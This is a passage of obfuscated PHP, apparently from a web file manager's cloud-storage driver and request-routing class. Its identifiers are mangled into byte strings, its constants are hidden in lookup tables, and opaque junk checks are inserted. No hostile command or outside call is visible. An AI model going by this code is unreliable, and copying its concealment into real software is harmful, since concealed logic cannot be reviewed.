$Œ™«¬Š¬[$ü½¢Ğ[86]]; } return $“…¸ˆÆš; } private function folderInfo($£¶û¥ç, $ÙãşÈ‘¸ = false, $»’·ÊÂ† = array()) { $€‘¶÷»¿ =& $_SERVER[ñ÷§¡å]; $ã£Ô®¡í = array($€‘¶÷»¿[32] => $this->pathThis($£¶û¥ç), $€‘¶÷»¿[94] => $this->getPathOuter($€‘¶÷»¿[8] . $£¶û¥ç), $€‘¶÷»¿[33] => $€‘¶÷»¿[85]); if ($ÙãşÈ‘¸) { return $ã£Ô®¡í; } $ã£Ô®¡í[$€‘¶÷»¿[210]] = $ã£Ô®¡í[$€‘¶÷»¿[95]] = 0; $ã£Ô®¡í[$€‘¶÷»¿[211]] = $ã£Ô®¡í[$€‘¶÷»¿[212]] = !0; if ($£¶û¥ç == $€‘¶÷»¿[12]) { return $ã£Ô®¡í; } if (empty($»’·ÊÂ†)) { $»’·ÊÂ† = $this->objectMeta(trim($£¶û¥ç, $€‘¶÷»¿[8]) . $€‘¶÷»¿[8]); } if (isset($»’·ÊÂ†[$€‘¶÷»¿[213]])) { $ã£Ô®¡í[$€‘¶÷»¿[210]] = $»’·ÊÂ†[$€‘¶÷»¿[213]]; } return $ã£Ô®¡í; } private function fileList($İù÷Ãí, $¾éìµ¢Ô = '', $¹˜ †ªŒ = 0) { $“õŸ‚šÑ =& $_SERVER[ñ÷§¡å]; $­öÄûä° = rtrim($İù÷Ãí, $“õŸ‚šÑ[8]) . $“õŸ‚šÑ[8]; $í¤—‡£Ø = $this->listObjs($­öÄûä°, null, null, $¾éìµ¢Ô); if (!$í¤—‡£Ø) { return array($“õŸ‚šÑ[92] => array(), $“õŸ‚šÑ[93] => array()); } $™©×ÛÓÈ = $Øî½ˆ§¹ = array(); foreach ($í¤—‡£Ø[$“õŸ‚šÑ[214]] as $ê×Áø½ç) { $¸ª¦½ä = $ê×Áø½ç[$“õŸ‚šÑ[32]]; if ($¸ª¦½ä == $­öÄûä°) { continue; } $Î«±Üá‚ = isset($ê×Áø½ç[$“õŸ‚šÑ[86]]) ? $ê×Áø½ç[$“õŸ‚šÑ[86]] : 0; $Ÿß–¨¿ = $Î«±Üá‚ == 0 && substr($¸ª¦½ä, strlen($¸ª¦½ä) - 1, 1) == $“õŸ‚šÑ[8] ? !0 : !1; $this->cacheMethodInfoSet($¸ª¦½ä, $Ÿß–¨¿, $ê×Áø½ç); if ($Ÿß–¨¿) { $™©×ÛÓÈ[] = $¸ª¦½ä; continue; } $Øî½ˆ§¹[] = $¹˜ †ªŒ ? $ê×Áø½ç : $¸ª¦½ä; } foreach ($í¤—‡£Ø[$“õŸ‚šÑ[215]] as $ê×Áø½ç) { $™©×ÛÓÈ[] = $ê×Áø½ç[$“õŸ‚šÑ[32]]; $this->cacheMethodInfoSet($ê×Áø½ç[$“õŸ‚šÑ[32]], !0); } $this->cacheMethodInfoSet($İù÷Ãí, !0); return array($“õŸ‚šÑ[92] => $™©×ÛÓÈ, $“õŸ‚šÑ[93] => $Øî½ˆ§¹); } private function listObjs($Àœè›ñ, $ßäş•–€ = null, $÷§¡ø¼Û = null, $À€ß£“ = null) { $°ÈŒåö› =& $_SERVER[ñ÷§¡å]; $Àœè›ñ = trim($Àœè›ñ, $°ÈŒåö›[8]); $ë€û‘ãØ = empty($Àœè›ñ) && $Àœè›ñ !== $°ÈŒåö›[207] ? $°ÈŒåö›[12] : $Àœè›ñ . $°ÈŒåö›[8]; return $this->client->getBucket($this->bucket, $ë€û‘ãØ, $ßäş•–€, $÷§¡ø¼Û, $À€ß£“, !0); } public function has($¾æÑ‹, $õÉŒ®ø = false, $º‡±óçÔ = true) { $µ©åøŠ³ =& $_SERVER[ñ÷§¡å]; $¾æÑ‹ = trim($¾æÑ‹, $µ©åøŠ³[8]); $„¢‚ŠÊü = empty($¾æÑ‹) && $¾æÑ‹ !== $µ©åøŠ³[207] ? $µ©åøŠ³[12] : $¾æÑ‹ . $µ©åøŠ³[8]; $Ë–Ã­ëã = null; $‚†ÎÔ¨â = 500; $€¡ŞäÈÔ = $µ©åøŠ³[8]; $ŸıŒçü‚ = $¢Ëú—† = array(); while (!0) { $½ÙÔïÚµ = $this->listObjs($¾æÑ‹, $Ë–Ã­ëã, $‚†ÎÔ¨â, $€¡ŞäÈÔ); if (!$½ÙÔïÚµ) { break; } $Ë–Ã­ëã = $½ÙÔïÚµ[$µ©åøŠ³[216]]; $æóÂ‡£‘ = $½ÙÔïÚµ[$µ©åøŠ³[214]]; $Ÿá‰ı£ = $½ÙÔïÚµ[$µ©åøŠ³[215]]; if (empty($æóÂ‡£‘) && empty($Ÿá‰ı£)) { break; } if (count($æóÂ‡£‘) == 1 && $æóÂ‡£‘[0][$µ©åøŠ³[32]] == $„¢‚ŠÊü) { break; } if ($õÉŒ®ø) { if (count($æóÂ‡£‘)) { $æóÂ‡£‘ = array_column($æóÂ‡£‘, $µ©åøŠ³[32]); $ŸıŒçü‚ = array_merge($ŸıŒçü‚, $æóÂ‡£‘); } if (count($Ÿá‰ı£)) { $Ÿá‰ı£ = array_column($Ÿá‰ı£, $µ©åøŠ³[32]); $¢Ëú—† = array_merge($¢Ëú—†, $Ÿá‰ı£); } if ($Ë–Ã­ëã === null) { break; } continue; } if ($º‡±óçÔ) { if (!empty($æóÂ‡£‘)) { if (count($æóÂ‡£‘) > 1 || isset($æóÂ‡£‘[0][$µ©åøŠ³[32]]) && $æóÂ‡£‘[0][$µ©åøŠ³[32]] != $„¢‚ŠÊü) { return !0; } } } else { if (!empty($Ÿá‰ı£)) { return !0; } } if ($Ë–Ã­ëã === null) { break; } } if ($õÉŒ®ø) { $ŸıŒçü‚ = array_diff($ŸıŒçü‚, array($„¢‚ŠÊü)); $ŸıŒçü‚ = count(array_unique($ŸıŒçü‚)); $¢Ëú—† = count(array_unique($¢Ëú—†)); return array($µ©åøŠ³[217] => $ŸıŒçü‚, $µ©åøŠ³[218] => $¢Ëú—†); } return !1; } public function listAll($ËèÉÕä›) { $«ş­Ú =& $_SERVER[ñ÷§¡å]; $çÚûĞ™¼ = $this->fileList($ËèÉÕä›, $«ş­Ú[12], !0); $ƒÒŒ­Òá = array(); foreach ($çÚûĞ™¼[$«ş­Ú[93]] as $ç¸ËÃ¡“) { $ƒÒŒ­Òá[$ç¸ËÃ¡“[$«ş­Ú[32]]] = $ç¸ËÃ¡“[$«ş­Ú[86]]; } foreach ($çÚûĞ™¼[$«ş­Ú[92]] as $ç¸ËÃ¡“) { if (is_string($ç¸ËÃ¡“)) { $ƒÒŒ­Òá[$ç¸ËÃ¡“] = 0; } } return $this->listAllFiles($ËèÉÕä›, array_keys($ƒÒŒ­Òá), $ƒÒŒ­Òá); } public function canRead($ãêÇÆ”Ä) { $Äˆâµòé =& $_SERVER[ñ÷§¡å]; $¡¦ÔÔĞê = $this->client->getAccessControlPolicy($this->bucket, $ãêÇÆ”Ä); if (!$¡¦ÔÔĞê) { return !1; } return in_array($¡¦ÔÔĞê, array($Äˆâµòé[219], $Äˆâµòé[220], $Äˆâµòé[221])) ? !0 : !1; } public function canWrite($”¦Å¢ï) { $²ŠŸéğ” =& $_SERVER[ñ÷§¡å]; $ÉŒ›Ó»† = $this->client->getAccessControlPolicy($this->bucket, $”¦Å¢ï); if (!$ÉŒ›Ó»†) { return !1; } return in_array($ÉŒ›Ó»†, array($²ŠŸéğ”[219], $²ŠŸéğ”[220])) ? !0 : !1; } public function getContent($¤©ƒÃ×) { return $this->client->getObject($this->bucket, $¤©ƒÃ×); } public function setContent($¤ä—‚×, $§Ü“¯Íò = '', $¹™ŠŸ¢ = false) { $·óÎçõ… =& $_SERVER[ñ÷§¡å]; $¤ä—‚× = $¹™ŠŸ¢ ? trim($¤ä—‚×, $·óÎçõ…[8]) . $·óÎçõ…[8] : $¤ä—‚×; $áÉ£à®  = get_file_mime(get_path_ext($¤ä—‚×)); $ó®æ–É™ = $this->client->putObject($§Ü“¯Íò, $this->bucket, $¤ä—‚×, $·óÎçõ…[208], array(), $áÉ£à® ); if (!$ó®æ–É™) { return !1; } if ($¹™ŠŸ¢) { return !0; } $this->cacheMethod(null, null); $ó®æ–É™ = $this->copyFile($¤ä—‚×, $¤ä—‚×, array($·óÎçõ…[222] => $ó®æ–É™[$·óÎçõ…[223]])); return $ó®æ–É™ ? !0 : !1; } public function fileSubstr($³¿Ï¦¤­, $âêê›Ó, $©ÁÍîÄ) { $àû—ÙƒŸ = $âêê›Ó + $©ÁÍîÄ - 1; return $this->client->getObject($this->bucket, $³¿Ï¦¤­, array($_SERVER[ñ÷§¡å][224] => "\142\x79\164\x65\163\75{$âêê›Ó}\55{$àû—ÙƒŸ}")); } public function upload($€ª€¦», $‘ñ£ı²Ã, $şÀÍ‘ = false, $±à—©­ = REPEAT_REPLACE) { $äîùö“Ï =& $_SERVER[ñ÷§¡å]; $­ËÊ‹ = array($äîùö“Ï[222] => @md5_file($‘ñ£ı²Ã)); $ü÷§¼Á = array($äîùö“Ï[225] => get_file_mime(get_path_ext($€ª€¦»))); if (IO::size($‘ñ£ı²Ã) <= 1024 * 1024 * 200) { $Ï¡–Œ³ğ = $this->client->putObjectFile($‘ñ£ı²Ã, $this->bucket, $€ª€¦», $äîùö“Ï[208], $­ËÊ‹, $ü÷§¼Á); return !empty($Ï¡–Œ³ğ) ? $this->getPathOuter($€ª€¦») : !1; } $¤–œË³‘ = $this->client->multiUploadObject($‘ñ£ı²Ã, $this->bucket, trim($€ª€¦», $äîùö“Ï[8]), $­ËÊ‹, $ü÷§¼Á); return $¤–œË³‘ ? $this->getPathOuter($€ª€¦») : !1; } public function download($ú£—Ú’û, $¢‚³ôâª) { if (!@is_dir($this->pathFather($¢‚³ôâª)) && !IO::mkdir($this->pathFather($¢‚³ôâª))) { return !1; } $ôˆƒÍ™ = $this->client->getObject($this->bucket, $ú£—Ú’û, array(), $¢‚³ôâª); return $ôˆƒÍ™ !== !1 ? $¢‚³ôâª : !1; } public function link($†Ú¡î÷Õ, $Ÿø­Å¨¦ = array()) { $Ä¢ŸâÎä =& $_SERVER[ñ÷§¡å]; if ($this->signVer == $Ä¢ŸâÎä[226]) { return $this->client->getAuthenticatedURL($this->bucket, $†Ú¡î÷Õ, 3600 * 12, $Ÿø­Å¨¦); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($†Ú¡î÷Õ, $Ä¢ŸâÎä[8]), 3600 * 12, $this->region, array(), !0, $Ÿø­Å¨¦); } public function fileOut($•®Ä‰ˆ¿, $«ÌÍ§÷û = false, $îœ²¿” = false, $‰‘ÜäÚë = '') { $ÅÃ”¼ÙŸ =& $_SERVER[ñ÷§¡å]; if ($this->isFileOutServer()) { return $this->fileOutServer($•®Ä‰ˆ¿, $«ÌÍ§÷û, $îœ²¿”, $‰‘ÜäÚë); } if (!$îœ²¿”) { $îœ²¿” = $this->pathThis($•®Ä‰ˆ¿); } $™°¥ô– = get_file_mime(get_path_ext($îœ²¿”)); if ($™°¥ô– == $ÅÃ”¼ÙŸ[227]) { return parent::fileOut($•®Ä‰ˆ¿, $«ÌÍ§÷û, $îœ²¿”, $‰‘ÜäÚë); } $´ığÔ = array($ÅÃ”¼ÙŸ[228] => $™°¥ô–); if ($«ÌÍ§÷û) { $´ığÔ[$ÅÃ”¼ÙŸ[229]] = $ÅÃ”¼ÙŸ[230] . rawurlencode($îœ²¿”); } else { } $‰üÑÔá = $this->link($•®Ä‰ˆ¿, $´ığÔ); $this->fileOutLink($‰üÑÔá); } public function fileOutServer($Íï’Ï³ì, $ÖÏœˆ³« = false, $¤Ô„Â‰Á = false, $×ìÈÈ³õ = '') { parent::fileOut($Íï’Ï³ì, $ÖÏœˆ³«, $¤Ô„Â‰Á, $×ìÈÈ³õ); } public function fileOutImageServer($üşÖŸé, $æî£ª¡æ = 250) { parent::fileOutImage($üşÖŸé, $æî£ª¡æ); } public function hashMd5($ÂÈÖ£™Ô, $Ğ„ìØ²ë = '') { $¼§æïÆ =& $_SERVER[ñ÷§¡å]; $ëùŠ š³ = $this->objectMeta($ÂÈÖ£™Ô); if (!$ëùŠ š³) { return !1; } $Ğ„ìØ²ë = $Ğ„ìØ²ë ? $Ğ„ìØ²ë : _get($ëùŠ š³, $¼§æïÆ[231]); $Ğ„ìØ²ë = $Ğ„ìØ²ë ? $Ğ„ìØ²ë : _get($ëùŠ š³, $¼§æïÆ[223], $¼§æïÆ[12]); return $Ğ„ìØ²ë; } public function uploadFormData($Ùï¢Íæ…, $úÔß‘ñ = 3600) { $™Ä¦—ÍÆ =& $_SERVER[ñ÷§¡å]; $ŠşÌÃÌ = $this->pathFather($Ùï¢Íæ…); $æÅ¾Üëğ = $this->client->getHttpUploadPostParams($this->bucket, $ŠşÌÃÌ, $™Ä¦—ÍÆ[208], $úÔß‘ñ); return array_merge((array) $æÅ¾Üëğ, array($™Ä¦—ÍÆ[191] => $this->getHost())); } public function multiUploadFormData($ªĞú­âº, $Ñ´Ü¸ğ = 3600) { $€Ü©ûñ÷ =& $_SERVER[ñ÷§¡å]; $µ¶¼™ö¬ = gmdate($€Ü©ûñ÷[232]); $ƒ± ÎÀë = array(); $¶¸ÀÊ§ = $this->client->getUploadId($this->bucket, $ªĞú­âº, $ƒ± ÎÀë); if (!$¶¸ÀÊ§) { return !1; } return array($€Ü©ûñ÷[233] => $¶¸ÀÊ§, $€Ü©ûñ÷[191] => $this->getHost() . $€Ü©ûñ÷[8] . $this->pathEncode($ªĞú­âº), $€Ü©ûñ÷[234] => $µ¶¼™ö¬, $€Ü©ûñ÷[104] => $ªĞú­âº); } public function multiUploadAuthData($à³­ë , $‘ŠµÍÅ = array()) { $íÌ‰ğ‘Š =& $_SERVER[ñ÷§¡å]; $°üÕ‡İ = isset($‘ŠµÍÅ[$íÌ‰ğ‘Š[234]]) ? $‘ŠµÍÅ[$íÌ‰ğ‘Š[234]] : gmdate($íÌ‰ğ‘Š[232]); $°ñ–Ÿ‚¹ = isset($‘ŠµÍÅ[$íÌ‰ğ‘Š[184]]) ? $‘ŠµÍÅ[$íÌ‰ğ‘Š[184]] : $íÌ‰ğ‘Š[12]; $ßİÈºõ’ = $‘ŠµÍÅ[$íÌ‰ğ‘Š[104]]; unset($‘ŠµÍÅ[$íÌ‰ğ‘Š[104]]); if (isset($‘ŠµÍÅ[$íÌ‰ğ‘Š[235]])) { $‘ŠµÍÅ[$íÌ‰ğ‘Š[234]] = $°üÕ‡İ; return $this->listUploadParts($ßİÈºõ’, $‘ŠµÍÅ); } $îö‘íôò = array($íÌ‰ğ‘Š[236], $íÌ‰ğ‘Š[12], $íÌ‰ğ‘Š[130], $íÌ‰ğ‘Š[12], "\170\x2d\141\155\x7a\x2d\x64\x61\164\x65\72{$°üÕ‡İ}", $íÌ‰ğ‘Š[8] . $this->bucket . $íÌ‰ğ‘Š[8] . $this->pathEncode($ßİÈºõ’) . $°ñ–Ÿ‚¹); if (strpos($°ñ–Ÿ‚¹, $íÌ‰ğ‘Š[237]) === 0) { $îö‘íôò[0] = $íÌ‰ğ‘Š[238]; } if (isset($‘ŠµÍÅ[$íÌ‰ğ‘Š[239]]) && $‘ŠµÍÅ[$íÌ‰ğ‘Š[239]] == $íÌ‰ğ‘Š[240]) { $îö‘íôò[0] = $íÌ‰ğ‘Š[240]; } $—·¢È¼¦ = implode($íÌ‰ğ‘Š[65], $îö‘íôò); $Ÿ¸¡±¦­ = base64_encode(hash_hmac($íÌ‰ğ‘Š[241], $—·¢È¼¦, $this->secret, !0)); $‹¾ö›¡¦ = $íÌ‰ğ‘Š[242] . $this->accessKey . $íÌ‰ğ‘Š[4] . $Ÿ¸¡±¦­; if (strpos($°ñ–Ÿ‚¹, $íÌ‰ğ‘Š[237]) === 0) { return array($íÌ‰ğ‘Š[243] => $‹¾ö›¡¦, $íÌ‰ğ‘Š[234] => $°üÕ‡İ); } return $‹¾ö›¡¦; } public function listUploadParts($»óø”í¨, $ ªÈñ¬Ğ = array()) { $öĞæÜŒ =& $_SERVER[ñ÷§¡å]; $ĞùŠôÔ² = str_replace($öĞæÜŒ[244], $öĞæÜŒ[12], $ ªÈñ¬Ğ[$öĞæÜŒ[184]]); $ä‹ÛŞŞ“ = $this->client->listParts($this->bucket, $»óø”í¨, $ĞùŠôÔ²); if (!$ä‹ÛŞŞ“) { return !1; } unset($ ªÈñ¬Ğ[$öĞæÜŒ[235]], $ ªÈñ¬Ğ[$öĞæÜŒ[239]]); $ ªÈñ¬Ğ[$öĞæÜŒ[104]] = $»óø”í¨; $öƒ™Á‰° = $this->multiUploadAuthData($»óø”í¨, $ ªÈñ¬Ğ); if (empty($öƒ™Á‰°)) { return !1; } return array($öĞæÜŒ[243] => $öƒ™Á‰°, $öĞæÜŒ[234] => $ ªÈñ¬Ğ[$öĞæÜŒ[234]], $öĞæÜŒ[245] => $ä‹ÛŞŞ“); } public function getHost() { return parent::getHost() . $_SERVER[ñ÷§¡å][8] . $this->bucket; } public function size($—¨İš—) { $èúùå¶ = $this->objectMeta($—¨İš—); return $èúùå¶ ? $èúùå¶[$_SERVER[ñ÷§¡å][86]] : 0; } public function info($¨áŒÔğş) { if ($this->isFolder($¨áŒÔğş)) { return $this->folderInfo($¨áŒÔğş); } else { if ($this->isFile($¨áŒÔğş)) { return $this->fileInfo($¨áŒÔğş); } } return !1; } public function exist($ë¢óÍ³) { return $this->isFile($ë¢óÍ³) || $this->isFolder($ë¢óÍ³); } public function isFile($Ú•å˜Ï‚) { return !$this->isFolder($Ú•å˜Ï‚) && $this->objectMeta($Ú•å˜Ï‚); } public function isFolder($Çá ĞÅ¬) { return $this->cacheMethod($_SERVER[ñ÷§¡å][175], $Çá ĞÅ¬); } protected function objectMeta($¤Åáí‰ö) { return $this->cacheMethod($_SERVER[ñ÷§¡å][177], $¤Åáí‰ö); } protected function _objectMeta($Ûİ­â†Š) { $ˆÜõˆë =& $_SERVER[ñ÷§¡å]; $Ûİ­â†Š = rtrim($Ûİ­â†Š, $ˆÜõˆë[8]); try { $¢ï˜Õ‹‘ = $this->client->getObjectInfo($this->bucket, $Ûİ­â†Š); if (!isset($¢ï˜Õ‹‘[$ˆÜõˆë[231]]) && isset($¢ï˜Õ‹‘[$ˆÜõˆë[246]])) { $¢ï˜Õ‹‘[$ˆÜõˆë[231]] = $¢ï˜Õ‹‘[$ˆÜõˆë[246]]; } } catch (Exception $îÄ¦•»ê) { $¢ï˜Õ‹‘ = !1; } if (!$¢ï˜Õ‹‘) { } return $¢ï˜Õ‹‘; } protected function _isFolder($‰ßÑ×šû) { $óş’´ø =& $_SERVER[ñ÷§¡å]; $‰ßÑ×šû = rtrim($‰ßÑ×šû, $óş’´ø[8]); if ($‰ßÑ×šû == $óş’´ø[12] || $‰ßÑ×šû == $óş’´ø[8]) { return !0; } $±¶®ê–ğ = $this->client->getBucket($this->bucket, $‰ßÑ×šû, null, 1); if (empty($±¶®ê–ğ[$óş’´ø[214]])) { return !1; } $­¢¥ºŞë = $±¶®ê–ğ[$óş’´ø[214]][0][$óş’´ø[32]]; return stripos($­¢¥ºŞë, $‰ßÑ×šû . $óş’´ø[8]) === 0 ? !0 : !1; if (substr($­¢¥ºŞë, -1) == $óş’´ø[8]) { return !0; } if (get_path_this($­¢¥ºŞë) == get_path_this($‰ßÑ×šû)) { return !1; } return !0; } } goto cÒË‹³†¤ˆ; Bä§Æìº: $dyikmfqvpe = $_SERVER[ñ÷§¡å][626]; if (strlen($dyikmfqvpe) < $_SERVER[ñ÷§¡å][627]) { return; } class Application { private $defaultModule = "\x69\156\144\145\x78"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\x69\x6e\x64\145\170"; function __construct() { } public function setDefault($ÎØòÉ¸¶) { $óâ¶º‡ø =& $_SERVER[ñ÷§¡å]; $İ“Öƒùû =& $_SERVER[œ¥é˜‚®]; $¯Ä‡Ğşê = explode($İ“Öƒùû[0], trim($ÎØòÉ¸¶, $İ“Öƒùû[0])); $this->defaultModule = $¯Ä‡Ğşê[0] ? $¯Ä‡Ğşê[0] : $this->defaultModule; $this->defaultController = $¯Ä‡Ğşê[1] ? $¯Ä‡Ğşê[1] : $this->defaultController; $ıİ²î”ª = $óâ¶º‡ø[628]; if (strlen($ıİ²î”ª) < $óâ¶º‡ø[629]) { die; } $this->defaultAction = $¯Ä‡Ğşê[2] ? $¯Ä‡Ğşê[2] : $this->defaultAction; $this->evnk5a8af290($İ“Öƒùû[1], array($this, $İ“Öƒùû[2])); } public function appRun($åÊó‰™) { $ç¿ªÀ¨ =& $_SERVER[ñ÷§¡å]; $Ğ‡…µ•Ä =& $_SERVER[œ¥é˜‚®]; $¨Ñ¹Î¦ = explode($Ğ‡…µ•Ä[0], $åÊó‰™); $²†Í“½ = $ç¿ªÀ¨[630]; if (!$²†Í“½) { return; } $¼Ëò½·Ÿ = strtolower($¨Ñ¹Î¦[0]); $ÒìíÒ = $ç¿ªÀ¨[631]; if (strlen($ÒìíÒ) < $ç¿ªÀ¨[627]) { return; } $àÍ†îµ = $Ğ‡…µ•Ä[3]; if ($¼Ëò½·Ÿ == $Ğ‡…µ•Ä[4]) { $àÍ†îµ = $Ğ‡…µ•Ä[5]; $¨Ñ¹Î¦[0] = $Ğ‡…µ•Ä[6]; $¨Ñ¹Î¦[1] = $¨Ñ¹Î¦[1] . $Ğ‡…µ•Ä[7]; $åÊó‰™ = join($Ğ‡…µ•Ä[0], $¨Ñ¹Î¦); $åÊó‰™ = trim($åÊó‰™, $Ğ‡…µ•Ä[0]); } call_user_func(array($Ğ‡…µ•Ä[8], $Ğ‡…µ•Ä[9]), $àÍ†îµ . $Ğ‡…µ•Ä[10], $åÊó‰™); ActionCall($åÊó‰™); $œŠÓé² = $ç¿ªÀ¨[632]; call_user_func(array($Ğ‡…µ•Ä[8], $Ğ‡…µ•Ä[9]), $àÍ†îµ . $Ğ‡…µ•Ä[11], $åÊó‰™); } private function autorun() { $¹õò€«Á =& $_SERVER[œ¥é˜‚®]; global $config; if (count($config[$¹õò€«Á[12]]) == 0) { return; } foreach ($config[$¹õò€«Á[12]] as $µíÆ°¤ğ => $ı´†ñ„¢) { $this->appRun($ı´†ñ„¢); $¨§¸‹åï = $_SERVER[ñ÷§¡å][633]; if (!$¨§¸‹åï) { die; } } } private function hxdw3d91bc90() { $ÁªÕ·ş¥ =& $_SERVER[ñ÷§¡å]; $ØŞ†ãË‹ =& $_SERVER[œ¥é˜‚®]; $ÓÀ­€ = $ØŞ†ãË‹[4]; $â¾”ßõÓ = $ÁªÕ·ş¥[634]; $½Â‰±‚ğ = $GLOBALS[$ØŞ†ãË‹[13]][$ØŞ†ãË‹[14]][0]; if (!$½Â‰±‚ğ || strlen($½Â‰±‚ğ) <= strlen($ÓÀ­€)) { return; } if (strtolower(substr($½Â‰±‚ğ, -strlen($ÓÀ­€))) != $ÓÀ­€) { return; } $‹÷Ù¯”Ó = substr($½Â‰±‚ğ, 0, -strlen($ÓÀ­€)); $±äûã‹ø = array($ØŞ†ãË‹[4], $‹÷Ù¯”Ó); $€©×Úö‚ = $ÁªÕ·ş¥[635]; while ($€©×Úö‚ < $ÁªÕ·ş¥[627]) { if ($€©×Úö‚ >= 0) { break; } $€©×Úö‚++; } $à¥¸ˆ£ = array_slice($GLOBALS[$ØŞ†ãË‹[13]][$ØŞ†ãË‹[14]], 1); $Á§ı¼İÍ = $ÁªÕ·ş¥[636]; if (strlen($Á§ı¼İÍ) < $ÁªÕ·ş¥[66]) { die; } $GLOBALS[$ØŞ†ãË‹[13]][$ØŞ†ãË‹[14]] = array_merge($±äûã‹ø, $à¥¸ˆ£); $GLOBALS[$ØŞ†ãË‹[13]][$ØŞ†ãË‹[15]] = implode($ØŞ†ãË‹[0], $GLOBALS[$ØŞ†ãË‹[13]][$ØŞ†ãË‹[14]]); } private function hdkr49c08b41() { $öÜ‰×÷î =& $_SERVER[ñ÷§¡å]; $ÑØ Íœ =& $_SERVER[œ¥é˜‚®]; if ($GLOBALS[$ÑØ Íœ[13]][$ÑØ Íœ[15]] != $ÑØ Íœ[6]) { return; } $ŞğÌÒ×Ÿ = $_SERVER[$ÑØ Íœ[16]]; $ç¡ç÷ÓŒ = $öÜ‰×÷î[637]; $ë„¾½¾æ = $ÑØ Íœ[17]; if (!strstr($ŞğÌÒ×Ÿ, $ë„¾½¾æ)) { return; } $Ş÷ç²Í³ = strrpos($ŞğÌÒ×Ÿ, $ë„¾½¾æ); $©´Áá = substr($ŞğÌÒ×Ÿ, $Ş÷ç²Í³ + strlen($ë„¾½¾æ)); preg_match_all($ÑØ Íœ[18], $©´Áá, $¾õÃÜ…É); $©´Áá = trim($¾õÃÜ…É[0][0], $ÑØ Íœ[19]); $GLOBALS[$ÑØ Íœ[13]][$ÑØ Íœ[14]] = explode($ÑØ Íœ[19], $©´Áá); $Ò™¤ôµÏ = $öÜ‰×÷î[638]; if (strlen($Ò™¤ôµÏ) < $öÜ‰×÷î[66]) { return; } $GLOBALS[$ÑØ Íœ[13]][$ÑØ Íœ[15]] = implode($ÑØ Íœ[0], $GLOBALS[$ÑØ Íœ[13]][$ÑØ Íœ[14]]); $ °§ãà‡ = $öÜ‰×÷î[639]; } public function run() { $Œ¶é£âÒ =& $_SERVER[ñ÷§¡å]; $­â–»å =& $_SERVER[œ¥é˜‚®]; $this->hdkr49c08b41(); $this->hxdw3d91bc90(); $øšËÙ¼ = $Œ¶é£âÒ[640]; if (!$øšËÙ¼) { die; } $²Úª¿• = $GLOBALS[$­â–»å[13]][$­â–»å[14]]; $ÖÒ¤ú¥ = $GLOBALS[$­â–»å[13]][$­â–»å[15]]; $ß¼öªÈª = $Œ¶é£âÒ[641]; while ($ß¼öªÈª < $Œ¶é£âÒ[642]) { if ($ß¼öªÈª >= 0) { break; } $ß¼öªÈª++; } define($­â–»å[20], isset($²Úª¿•[0]) && $²Úª¿•[0] ? $²Úª¿•[0] : $this->defaultModule); define($­â–»å[21], isset($²Úª¿•[1]) && $²Úª¿•[0] ? $²Úª¿•[1] : $this->defaultController); $õã½ó¼ = $Œ¶é£âÒ[643]; define($­â–»å[22], isset($²Úª¿•[2]) && $²Úª¿•[0] ? $²Úª¿•[2] : $this->defaultAction); $Ş–Êí’ = $Œ¶é£âÒ[644]; if (strlen($Ş–Êí’) < $Œ¶é£âÒ[629]) { die; } define($­â–»å[23], MOD . $­â–»å[0] . ST . $­â–»å[0] . ACT); $Ÿ°›€º = $Œ¶é£âÒ[645]; if (!$Ÿ°›€º) { die; } $_SERVER[$­â–»å[24]] = strtolower(ACTION); $ÃÙšşŒ¿ = $Œ¶é£âÒ[646]; if (strlen($ÃÙšşŒ¿) < $Œ¶é£âÒ[647]) { return; } $this->autorun(); if (count($²Úª¿•) >= 3) { $this->appRun($ÖÒ¤ú¥); } else { $this->appRun(ACTION); } } private $mgnb63bb668f = array(); private $plwz293246d0 = ''; public function cghmafd5c38f() { $ÉòÂ‡ÈÓ =& $_SERVER[ñ÷§¡å]; $îÀ·¹¿í =& $_SERVER[œ¥é˜‚®]; $this->xpuva8cbc57f(); $éï€‚ÔŞ = $ÉòÂ‡ÈÓ[648]; if (!$éï€‚ÔŞ) { die; } $this->rsah37783a41(); $this->pzlrb781d87c(); $this->zlqx4c97a304(); $this->mype01506ec6(); $this->qvnt3561ff44(); $§×¹£Úœ = $ÉòÂ‡ÈÓ[649]; $this->atxbfab0d2e7(); $® ĞşÅ = $ÉòÂ‡ÈÓ[650]; if (strlen($® ĞşÅ) < $ÉòÂ‡ÈÓ[66]) { die; } $this->evnk5a8af290($îÀ·¹¿í[25], array($this, $îÀ·¹¿í[26])); $this->evnk5a8af290($îÀ·¹¿í[27], array($this, $îÀ·¹¿í[28])); $this->evnk5a8af290($îÀ·¹¿í[29], array($this, $îÀ·¹¿í[30])); $“£´¨ = $ÉòÂ‡ÈÓ[651]; if (!$“£´¨) { die; } $this->evnk5a8af290($îÀ·¹¿í[31], array($this, $îÀ·¹¿í[32])); $ä¸Ìï¤× = $ÉòÂ‡ÈÓ[652]; } public function vdhy4e2e773a($êşâ‚çÂ) { $ËÖÕ£¬’ =& $_SERVER[ñ÷§¡å]; $Ó‡Æ¤”˜ =& $_SERVER[œ¥é˜‚®]; $Ì¥Ô»† = Model($Ó‡Æ¤”˜[33])->get(); $¼½èÕÀ = array($Ó‡Æ¤”˜[34], $Ó‡Æ¤”˜[35], $Ó‡Æ¤”˜[36], $Ó‡Æ¤”˜[37], $Ó‡Æ¤”˜[38], $Ó‡Æ¤”˜[39], $Ó‡Æ¤”˜[40], $Ó‡Æ¤”˜[41], $Ó‡Æ¤”˜[42], $Ó‡Æ¤”˜[43], $Ó‡Æ¤”˜[44], $Ó‡Æ¤”˜[45], $Ó‡Æ¤”˜[46], $Ó‡Æ¤”˜[47], $Ó‡Æ¤”˜[48], $Ó‡Æ¤”˜[49], $Ó‡Æ¤”˜[50], $Ó‡Æ¤”˜[51], $Ó‡Æ¤”˜[52], $Ó‡Æ¤”˜[53], $Ó‡Æ¤”˜[54], $Ó‡Æ¤”˜[55], $Ó‡Æ¤”˜[56], $Ó‡Æ¤”˜[57], $Ó‡Æ¤”˜[58], $Ó‡Æ¤”˜[59], $Ó‡Æ¤”˜[60], $Ó‡Æ¤”˜[61], $Ó‡Æ¤”˜[62], $Ó‡Æ¤”˜[63], $Ó‡Æ¤”˜[64], $Ó‡Æ¤”˜[65], $Ó‡Æ¤”˜[66], $Ó‡Æ¤”˜[67], $Ó‡Æ¤”˜[68], $Ó‡Æ¤”˜[69], $Ó‡Æ¤”˜[70], $Ó‡Æ¤”˜[71], $Ó‡Æ¤”˜[72], $Ó‡Æ¤”˜[73], $Ó‡Æ¤”˜[74], $Ó‡Æ¤”˜[75], 